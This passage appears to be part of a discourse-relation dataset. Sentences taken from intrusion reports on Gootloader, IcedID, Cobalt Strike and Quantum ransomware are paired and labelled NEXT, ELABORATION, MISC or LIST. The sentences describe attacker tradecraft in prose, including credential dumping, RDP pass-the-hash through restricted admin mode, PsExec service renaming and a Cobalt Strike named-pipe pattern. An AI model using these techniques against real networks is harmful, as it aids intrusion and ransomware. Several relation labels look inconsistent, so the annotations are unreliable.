        "S1": "They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.",
        "S2": "The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named powershell.dll.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion.",
        "S2": "On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session.",
        "relation": "MISC"
    },
    {
        "S1": "After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.",
        "S2": "They opened the documents one-by-one on the remote host via RDP.",
        "relation": "NEXT"
    },
    {
        "S1": "Our evidence shows that the attackers then began looking for interesting documents on file shares.",
        "S2": "As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.",
        "relation": "MISC"
    },
    {
        "S1": "They opened the documents one-by-one on the remote host via RDP.",
        "S2": "While having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.",
        "relation": "MISC"
    },
    {
        "S1": "On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session.",
        "S2": "During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.",
        "S2": "The threat actors were observed making use of double encoded Powershell commands.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor gained initial access using Gootloader malware.",
        "S2": "This was observed on multiple servers the threat actor pivoted to.",
        "relation": "MISC"
    },
    {
        "S1": "Here\u2019s a video of the user searching and downloading the malware via the poisoned SEO search.",
        "S2": "Gootloader upon execution creates two registry keys:",
        "relation": "NEXT"
    },
    {
        "S1": "The Javascript file is then executed when double clicked after the zip is opened.",
        "S2": "The Javascript (Gootloader) file invoked an encoded PowerShell command.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Gootloader upon execution creates two registry keys:",
        "S2": "The below diagram summarizes the Gootloader initial execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named powershell.dll.",
        "S2": "The PowerShell command will extract the .NET loader from HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0 and execute the code in memory via `Assembly.Load()`.",
        "relation": "NEXT"
    },
    {
        "S1": "The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named powershell.dll.",
        "S2": "The following shows the source code responsible for the core logic of the .NET loader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named powershell.dll.",
        "S2": "The .NET loader will read HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username and extract the encoded Cobalt Strike payload.",
        "relation": "NEXT"
    },
    {
        "S1": "Following the Registry events, a PowerShell command was launched executing an encoded command.",
        "S2": "The PowerShell command will extract the .NET loader from HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0 and execute the code in memory via `Assembly.Load()`.",
        "relation": "NEXT"
    },
    {
        "S1": "The PowerShell command will extract the .NET loader from HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0 and execute the code in memory via `Assembly.Load()`.",
        "S2": "Once the PowerShell script is finished running, the next stage involves the .NET loader.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the PowerShell script is finished running, the next stage involves the .NET loader.",
        "S2": "The Javascript (Gootloader) file invoked an encoded PowerShell command.",
        "relation": "MISC"
    },
    {
        "S1": "Once the PowerShell script is finished running, the next stage involves the .NET loader.",
        "S2": "The task created from the PowerShell script:",
        "relation": "MISC"
    },
    {
        "S1": "The .NET loader will read HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username and extract the encoded Cobalt Strike payload.",
        "S2": "The following shows the source code responsible for the core logic of the .NET loader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The .NET loader will read HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username and extract the encoded Cobalt Strike payload.",
        "S2": "During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.",
        "relation": "NEXT"
    },
    {
        "S1": "An excellent resource from Microsoft describes a set of configurations that can be applied to Windows that can stop .js files from executing, preventing this attack chain from ever getting off the ground.",
        "S2": "As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.",
        "S2": "As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.",
        "S2": "During the intrusion we observed various named pipes utilized by the threat actor\u2019s Cobalt Strike beacons including default Cobalt Strike named pipes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Javascript (Gootloader) file invoked an encoded PowerShell command.",
        "S2": "The task created from the PowerShell script:",
        "relation": "NEXT"
    },
    {
        "S1": "The task created from the PowerShell script:",
        "S2": "Furthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.",
        "relation": "NEXT"
    },
    {
        "S1": "Windows Defender scheduled scans were deleted from the system.",
        "S2": "Furthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was observed on multiple servers the threat actor pivoted to.",
        "S2": "During the intrusion we observed various named pipes utilized by the threat actor\u2019s Cobalt Strike beacons including default Cobalt Strike named pipes.",
        "relation": "MISC"
    },
    {
        "S1": "Furthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.",
        "S2": "The threat actors were observed making use of double encoded Powershell commands.",
        "relation": "MISC"
    },
    {
        "S1": "As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.",
        "S2": "During the intrusion we observed various named pipes utilized by the threat actor\u2019s Cobalt Strike beacons including default Cobalt Strike named pipes.",
        "relation": "MISC"
    },
    {
        "S1": "As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.",
        "S2": "This can be observed in the memory dump from the beachhead host with the tell-tale PAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers observable in the process memory space.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This can be observed in the memory dump from the beachhead host with the tell-tale PAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers observable in the process memory space.",
        "S2": "The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain.",
        "relation": "MISC"
    },
    {
        "S1": "During the intrusion we observed various named pipes utilized by the threat actor\u2019s Cobalt Strike beacons including default Cobalt Strike named pipes.",
        "S2": "As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "During the intrusion we observed various named pipes utilized by the threat actor\u2019s Cobalt Strike beacons including default Cobalt Strike named pipes.",
        "S2": "This will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the \u201cC:\\Users\u201d directory.",
        "relation": "MISC"
    },
    {
        "S1": "During the intrusion we observed various named pipes utilized by the threat actor\u2019s Cobalt Strike beacons including default Cobalt Strike named pipes.",
        "S2": "The Cobalt Strike beacon was used to invoke the PowerShell script.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors were observed making use of double encoded Powershell commands.",
        "S2": "The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were observed making use of double encoded Powershell commands.",
        "S2": "The malicious PowerShell process used by Gootloader dropped a PowerShell script named \u201cmi.ps1\u201d on the file system.",
        "relation": "MISC"
    },
    {
        "S1": "Decoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.",
        "S2": "Another PowerShell command was used to trigger the mi.ps1 script.",
        "relation": "MISC"
    },
    {
        "S1": "The malicious PowerShell process used by Gootloader dropped a PowerShell script named \u201cmi.ps1\u201d on the file system.",
        "S2": "Another PowerShell command was used to trigger the mi.ps1 script.",
        "relation": "MISC"
    },
    {
        "S1": "Another PowerShell command was used to trigger the mi.ps1 script.",
        "S2": "The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain.",
        "relation": "MISC"
    },
    {
        "S1": "In addition, the post-exploitation tool \u201cLaZagne\u201d (renamed to ls.exe)",
        "S2": "This will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the \u201cC:\\Users\u201d directory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain.",
        "S2": "They also ran a WMI command on the beachhead host and one other host to check for AntiVirus.",
        "relation": "NEXT"
    },
    {
        "S1": "The Cobalt Strike beacon was used to invoke the PowerShell script.",
        "S2": "As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike beacon was used to invoke the PowerShell script.",
        "S2": "While having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.",
        "relation": "MISC"
    },
    {
        "S1": "While having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.",
        "S2": "On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:",
        "relation": "NEXT"
    },
    {
        "S1": "On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:",
        "S2": "This method was used to pivot to other systems within the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:",
        "S2": "In this case, there was no further impact to the environment before the threat actors were evicted.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons.",
        "S2": "SMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.",
        "relation": "LIST"
    },
    {
        "S1": "As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons.",
        "S2": "Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network.",
        "relation": "NEXT"
    },
    {
        "S1": "This method was used to pivot to other systems within the network.",
        "S2": "Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network.",
        "relation": "MISC"
    },
    {
        "S1": "SMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.",
        "S2": "These executables were then executed by a remote service visible in the windows event id 7045 logs.",
        "relation": "NEXT"
    },
    {
        "S1": "SMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.",
        "S2": "Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network.",
        "relation": "NEXT"
    },
    {
        "S1": "One important aspect of these sessions is that the threat actor authenticated using \u201cRestricted Admin Mode\u201d.",
        "S2": "The threat actor attempted to use both Invoke-WMIExec and psexec to enable \u201cRestricted Admin Mode\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "One important aspect of these sessions is that the threat actor authenticated using \u201cRestricted Admin Mode\u201d.",
        "S2": "Restricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.",
        "S2": "The threat actor attempted to use both Invoke-WMIExec and psexec to enable \u201cRestricted Admin Mode\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor attempted to use both Invoke-WMIExec and psexec to enable \u201cRestricted Admin Mode\u201d.",
        "S2": "The threat actor accessed multiple files during the RDP sessions on multiple servers.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor accessed multiple files during the RDP sessions on multiple servers.",
        "S2": "Shellbags reveled attempts to enumerate multiple file shares containing information of interest to the threat actor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor was able to enter the network when a user endpoint was compromised by an IcedID payload contained within an ISO image.",
        "S2": "The ISO contained a DLL file (IcedID malware) and a LNK shortcut to execute it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor was able to enter the network when a user endpoint was compromised by an IcedID payload contained within an ISO image.",
        "S2": "After confirming their credentials worked with the WMI actions, the threat actor proceeded to RDP into that server, and attempted to drop and execute a Cobalt Strike DLL beacon on that server.",
        "relation": "NEXT"
    },
    {
        "S1": "We have high confidence this payload was delivered via email, however we were not able to identify the delivery email.",
        "S2": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "relation": "NEXT"
    },
    {
        "S1": "We have high confidence this payload was delivered via email, however we were not able to identify the delivery email.",
        "S2": "When the user clicks on the LNK file, the IcedID DLL is executed.",
        "relation": "NEXT"
    },
    {
        "S1": "The ISO contained a DLL file (IcedID malware) and a LNK shortcut to execute it.",
        "S2": "When the user clicks on the LNK file, the IcedID DLL is executed.",
        "relation": "NEXT"
    },
    {
        "S1": "The end user after clicking into the ISO file, could see just a single file named \u201cdocument\u201d, which is a LNK shortcut to a hidden DLL packaged in the ISO.",
        "S2": "After the initial execution of the IcedID malware, it established persistence by creating a copy of the malware (Ulfefi32.dll) in the AppData directory of the affected user and created a scheduled task to execute it every hour.",
        "relation": "NEXT"
    },
    {
        "S1": "The IcedID malware also created a scheduled task as a means of persistence on the beachhead host.",
        "S2": "This included an instance of C:\\Windows\\SysWOW64\\cmd.exe , which the IcedID malware used to hollow out and then inject a Cobalt Strike beacon into.",
        "relation": "MISC"
    },
    {
        "S1": "The IcedID malware also created a scheduled task as a means of persistence on the beachhead host.",
        "S2": "This Beacon was successful in connecting to the same command and control server observed on the beachhead host.",
        "relation": "MISC"
    },
    {
        "S1": "Around two hours later, Cobalt Strike was deployed using process hollowing and injection techniques.",
        "S2": "The Cobalt Strike process then proceeded to access LSASS memory to extract credentials, which a few minutes later were tested to run remote WMI discovery tasks on a server.",
        "relation": "NEXT"
    },
    {
        "S1": "This marked the start of \u201chands-on-keyboard\u201d activity by the threat actors.",
        "S2": "The threat actors gathered host based network information by running a batch script named ns.bat , which ran nslookup for each host in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors gathered host based network information by running a batch script named ns.bat , which ran nslookup for each host in the environment.",
        "S2": "After confirming their credentials worked with the WMI actions, the threat actor proceeded to RDP into that server, and attempted to drop and execute a Cobalt Strike DLL beacon on that server.",
        "relation": "NEXT"
    },
    {
        "S1": "After confirming their credentials worked with the WMI actions, the threat actor proceeded to RDP into that server, and attempted to drop and execute a Cobalt Strike DLL beacon on that server.",
        "S2": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "relation": "NEXT"
    },
    {
        "S1": "After confirming their credentials worked with the WMI actions, the threat actor proceeded to RDP into that server, and attempted to drop and execute a Cobalt Strike DLL beacon on that server.",
        "S2": "The RDP connections were established from the Cobalt Strike process running the beacon indicating the threat actor utilizing proxy on the beachhead host to facilitate the RDP traffic.:",
        "relation": "ELABORATION"
    },
    {
        "S1": "After confirming their credentials worked with the WMI actions, the threat actor proceeded to RDP into that server, and attempted to drop and execute a Cobalt Strike DLL beacon on that server.",
        "S2": "This ransomware deployment concluded less than four hours from the initial IcedID execution.",
        "relation": "NEXT"
    },
    {
        "S1": "This appeared to fail so the threat actor then opened cmd and proceeded to execute a PowerShell Cobalt Strike Beacon.",
        "S2": "For the next hour, the threat actor proceeded to make RDP connections to other servers in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "This Beacon was successful in connecting to the same command and control server observed on the beachhead host.",
        "S2": "Prior to the first lateral movement from the beachhead host, the threat actor tested credentials and gathered information from their targeted remote server using WMI",
        "relation": "MISC"
    },
    {
        "S1": "Once the threat actor had a handle on the layout of the domain, they prepared to deploy the ransomware by copying the ransomware (named ttsel.exe ) to each host through the C$ share folder.",
        "S2": "This ransomware deployment concluded less than four hours from the initial IcedID execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They used two methods of remote execution to detonate the ransomware binary, WMI and PsExec.",
        "S2": "Shortly after execution of the payload, several child processes were spawned that created persistence and began discovery on the host.",
        "relation": "MISC"
    },
    {
        "S1": "They used two methods of remote execution to detonate the ransomware binary, WMI and PsExec.",
        "S2": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "relation": "NEXT"
    },
    {
        "S1": "This ransomware deployment concluded less than four hours from the initial IcedID execution.",
        "S2": "The file document.lnk is a shortcut or lnk file and dar.dll was the IcedID payload.",
        "relation": "MISC"
    },
    {
        "S1": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "S2": "The threat actors managed to steal administrator account credentials, allowing them to move laterally across the Active Directory domain.",
        "relation": "MISC"
    },
    {
        "S1": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "S2": "We were able to determine the user mounted the ISO using the Event ID 12 in Microsoft-Windows-VHDMP-Operational.evtx as shown below:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor gained initial access through the common malware, IcedID.",
        "S2": "There were several additional indications of Cobalt Strike we observed to verify it was utilized by the threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "The payload was delivered within an ISO file, docs_invoice_173.iso , via email, where a user opened and executed the malware.",
        "S2": "The Quantum ransomware began to encrypt files across all hosts in the environment which then dropped the following ransom note: README_TO_DECRYPT.html",
        "relation": "NEXT"
    },
    {
        "S1": "The payload was delivered within an ISO file, docs_invoice_173.iso , via email, where a user opened and executed the malware.",
        "S2": "We were able to determine the user mounted the ISO using the Event ID 12 in Microsoft-Windows-VHDMP-Operational.evtx as shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We were able to determine the user mounted the ISO using the Event ID 12 in Microsoft-Windows-VHDMP-Operational.evtx as shown below:",
        "S2": "There were several additional indications of Cobalt Strike we observed to verify it was utilized by the threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "A quick look at document.lnk \u2018s properties highlight the command line that is executed on launch:",
        "S2": "When used on the file document.lnk , it parses out metadata such as when the shortcut file was made, what hostname and the MAC Address of the device it was created on and even the directory path of the user that created it!",
        "relation": "ELABORATION"
    },
    {
        "S1": "When used on the file document.lnk , it parses out metadata such as when the shortcut file was made, what hostname and the MAC Address of the device it was created on and even the directory path of the user that created it!",
        "S2": "The cmd.exe process spawned a suspicious instance of rundll32.exe .",
        "relation": "MISC"
    },
    {
        "S1": "Shortly after execution of the payload, several child processes were spawned that created persistence and began discovery on the host.",
        "S2": "After the initial execution of the IcedID malware, it established persistence by creating a copy of the malware (Ulfefi32.dll) in the AppData directory of the affected user and created a scheduled task to execute it every hour.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Shortly after execution of the payload, several child processes were spawned that created persistence and began discovery on the host.",
        "S2": "With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "This included an instance of C:\\Windows\\SysWOW64\\cmd.exe , which the IcedID malware used to hollow out and then inject a Cobalt Strike beacon into.",
        "S2": "After the initial execution of the IcedID malware, it established persistence by creating a copy of the malware (Ulfefi32.dll) in the AppData directory of the affected user and created a scheduled task to execute it every hour.",
        "relation": "MISC"
    },
    {
        "S1": "There were several additional indications of Cobalt Strike we observed to verify it was utilized by the threat actor.",
        "S2": "For more information on Cobalt Strike, you can read our article Cobalt Strike, a Defender\u2019s Guide.",
        "relation": "ELABORATION"
    },
    {
        "S1": "There were several additional indications of Cobalt Strike we observed to verify it was utilized by the threat actor.",
        "S2": "This behavior of rundll32.exe and a named pipe that matches postex_[0-9a-f]{4} , is the default behavior used by Cobalt Strike 4.2+ post exploitation jobs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "There were several additional indications of Cobalt Strike we observed to verify it was utilized by the threat actor.",
        "S2": "The threat actor also executed a PowerShell Cobalt Strike payload on some servers:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The cmd.exe process spawned a suspicious instance of rundll32.exe .",
        "S2": "Prior to using the PowerShell beacon the threat actor dropped a DLL beacon on the server (p227.dll), but this appears to have failed for unknown reasons after which, the threat actor moved on to the PowerShell beacon which executed successfully.",
        "relation": "MISC"
    },
    {
        "S1": "When we reviewed the memory of this process, we were able to confirm it was in fact Cobalt Strike when we successfully extracted the beacon configuration (additional details can be found in the Command and Control section).",
        "S2": "Given the timing of these commands were immediately after the execution of IcedID, we believe these commands were executed automatically upon check-in.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor also executed a PowerShell Cobalt Strike payload on some servers:",
        "S2": "Prior to using the PowerShell beacon the threat actor dropped a DLL beacon on the server (p227.dll), but this appears to have failed for unknown reasons after which, the threat actor moved on to the PowerShell beacon which executed successfully.",
        "relation": "MISC"
    },
    {
        "S1": "After the initial execution of the IcedID malware, it established persistence by creating a copy of the malware (Ulfefi32.dll) in the AppData directory of the affected user and created a scheduled task to execute it every hour.",
        "S2": "On one system, the threat actor injected into the winlogon process.",
        "relation": "LIST"
    },
    {
        "S1": "After the initial execution of the IcedID malware, it established persistence by creating a copy of the malware (Ulfefi32.dll) in the AppData directory of the affected user and created a scheduled task to execute it every hour.",
        "S2": "Given the timing of these commands were immediately after the execution of IcedID, we believe these commands were executed automatically upon check-in.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Process injection was observed during the intrusion by both IcedID and Cobalt Strike.",
        "S2": "Cobalt Strike Processes Identified by in Memory Yara Scanning.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Process injection was observed during the intrusion by both IcedID and Cobalt Strike.",
        "S2": "Suspicious accesses to LSASS process memory were observed during this intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Process injection was observed during the intrusion by both IcedID and Cobalt Strike.",
        "S2": "As mentioned in the Execution section, the IcedID process ran several initial discovery commands that provided environmental information about the host, network, and domain, to the threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "On one system, the threat actor injected into the winlogon process.",
        "S2": "Volatility Malfind output shows the embedded MZ header in the winlogon process with the setting PAGE_EXECUTE_READWRITE protection settings on the memory space, a commonly observed attribute of process injection.",
        "relation": "MISC"
    },
    {
        "S1": "On one system, the threat actor injected into the winlogon process.",
        "S2": "As mentioned in the Execution section, the IcedID process ran several initial discovery commands that provided environmental information about the host, network, and domain, to the threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike Processes Identified by in Memory Yara Scanning.",
        "S2": "Network connections to the Cobalt Strike server by winlogon were also observed in the process logs.",
        "relation": "MISC"
    },
    {
        "S1": "Network connections to the Cobalt Strike server by winlogon were also observed in the process logs.",
        "S2": "As illustrated below, those accesses have been made using both Windows Task Manager and rundll32.exe which is assessed to be a Cobalt Strike temporary beacon (as shown in the Execution graph):",
        "relation": "MISC"
    },
    {
        "S1": "Suspicious accesses to LSASS process memory were observed during this intrusion.",
        "S2": "The attacker in this intrusion initiated RDP connections from a workstation, named TERZITERZI.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors managed to steal administrator account credentials, allowing them to move laterally across the Active Directory domain.",
        "S2": "The actor used the Active Directory enumeration tool AdFind to collect information such as the users, computers and subnets in the domain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors managed to steal administrator account credentials, allowing them to move laterally across the Active Directory domain.",
        "S2": "Just shy of four hours into the intrusion, the threat actors began acting on their final objectives, domain wide ransomware deployment.",
        "relation": "NEXT"
    },
    {
        "S1": "As mentioned in the Execution section, the IcedID process ran several initial discovery commands that provided environmental information about the host, network, and domain, to the threat actor.",
        "S2": "The threat actor dropped the following files in C:\\Windows\\Temp directory:",
        "relation": "MISC"
    },
    {
        "S1": "The actor used the Active Directory enumeration tool AdFind to collect information such as the users, computers and subnets in the domain.",
        "S2": "Prior to the first lateral movement from the beachhead host, the threat actor tested credentials and gathered information from their targeted remote server using WMI",
        "relation": "NEXT"
    },
    {
        "S1": "The actor used the Active Directory enumeration tool AdFind to collect information such as the users, computers and subnets in the domain.",
        "S2": "After that, an additional batch script was created, ns.bat , which enumerated all host names in the domain with nslookup to identify the IP address of the host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Prior to the first lateral movement from the beachhead host, the threat actor tested credentials and gathered information from their targeted remote server using WMI",
        "S2": "The RDP connections were established from the Cobalt Strike process running the beacon indicating the threat actor utilizing proxy on the beachhead host to facilitate the RDP traffic.:",
        "relation": "NEXT"
    },
    {
        "S1": "Prior to the first lateral movement from the beachhead host, the threat actor tested credentials and gathered information from their targeted remote server using WMI",
        "S2": "With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor used RDP to move laterally to critical hosts.",
        "S2": "The attacker in this intrusion initiated RDP connections from a workstation, named TERZITERZI.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker in this intrusion initiated RDP connections from a workstation, named TERZITERZI.",
        "S2": "The RDP connections were established from the Cobalt Strike process running the beacon indicating the threat actor utilizing proxy on the beachhead host to facilitate the RDP traffic.:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker in this intrusion initiated RDP connections from a workstation, named TERZITERZI.",
        "S2": "Through-out the intrusion the threat actor was also observed using WMIC to perform lateral activities including discovery actions remotely, and as a second option, to ensure all the remote hosts successfully executed the final ransomware payload.",
        "relation": "MISC"
    },
    {
        "S1": "The RDP connections were established from the Cobalt Strike process running the beacon indicating the threat actor utilizing proxy on the beachhead host to facilitate the RDP traffic.:",
        "S2": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name ( mstdc ) of the remote service created on the target host (by default it\u2019s PSEXESVC).",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name ( mstdc ) of the remote service created on the target host (by default it\u2019s PSEXESVC).",
        "S2": "With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name ( mstdc ) of the remote service created on the target host (by default it\u2019s PSEXESVC).",
        "S2": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name (\u201cmstdc\u201d) of the remote service created on the target host (by default is PSEXESVC).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Through-out the intrusion the threat actor was also observed using WMIC to perform lateral activities including discovery actions remotely, and as a second option, to ensure all the remote hosts successfully executed the final ransomware payload.",
        "S2": "Just shy of four hours into the intrusion, the threat actors began acting on their final objectives, domain wide ransomware deployment.",
        "relation": "NEXT"
    },
    {
        "S1": "Through-out the intrusion the threat actor was also observed using WMIC to perform lateral activities including discovery actions remotely, and as a second option, to ensure all the remote hosts successfully executed the final ransomware payload.",
        "S2": "They first copied the payload, ttsel.exe , to the C$ share of each host on the network.",
        "relation": "MISC"
    },
    {
        "S1": "The WMIC commands prefaced with /node:IP Address allowed the threat actor to run commands on remote hosts.",
        "S2": "With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.",
        "S2": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name (\u201cmstdc\u201d) of the remote service created on the target host (by default is PSEXESVC).",
        "relation": "ELABORATION"
    },
    {
        "S1": "With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.",
        "S2": "The Quantum ransomware began to encrypt files across all hosts in the environment which then dropped the following ransom note: README_TO_DECRYPT.html",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name (\u201cmstdc\u201d) of the remote service created on the target host (by default is PSEXESVC).",
        "S2": "The alternate execution method the actor employed was a WMI call to start a remote process on the target host.",
        "relation": "MISC"
    },
    {
        "S1": "The alternate execution method the actor employed was a WMI call to start a remote process on the target host.",
        "S2": "Once authenticated, it displays the chat window with the threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "We assess with high confidence that the \u201cStolen Image Evidence\u201d email campaign was used to deliver the IcedID DLL.",
        "S2": "Upon execution of the IcedID DLL, a connection to a C2 server was established.",
        "relation": "NEXT"
    },
    {
        "S1": "We assess with high confidence that the \u201cStolen Image Evidence\u201d email campaign was used to deliver the IcedID DLL.",
        "S2": "In this intrusion, we observed usage of gmail[.]com and outlook[.]com email accounts for Atera agent registration.",
        "relation": "MISC"
    },
    {
        "S1": "This was first reported by Microsoft in April 2021.",
        "S2": "Change Control Page (ChCP) is a Microsoft utility for changing the console control page (language).",
        "relation": "MISC"
    },
    {
        "S1": "This was followed by the creation of a scheduled task on the beachhead host to establish persistence.",
        "S2": "The IcedID malware then used Windows utilities such as net, chcp, nltest, and wmic, to perform discovery activity on the host.",
        "relation": "MISC"
    },
    {
